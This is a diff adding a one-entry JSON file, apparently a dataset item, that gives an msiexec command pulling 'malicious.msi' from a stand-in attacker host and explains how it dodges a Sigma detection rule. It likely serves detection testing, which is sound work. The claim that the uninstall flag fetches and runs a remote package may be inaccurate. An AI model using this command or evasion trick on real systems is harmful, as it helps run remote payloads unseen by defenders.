@@ -1,0 +1,6 @@
+[
+  {
+    "output": "msiexec.exe /quiet /x http://attacker.com/malicious.msi",
+    "explanation": "The Sigma rule specifically looks for installation/package-related flags combined with the quiet flag. By using the '/x' (uninstall) flag instead of '-i', '-package', '-a', or '-j', the selection\\_cli criteria is not met, even though msiexec can still be used to fetch and execute a remote MSI via the uninstall routine."
+  }
+]
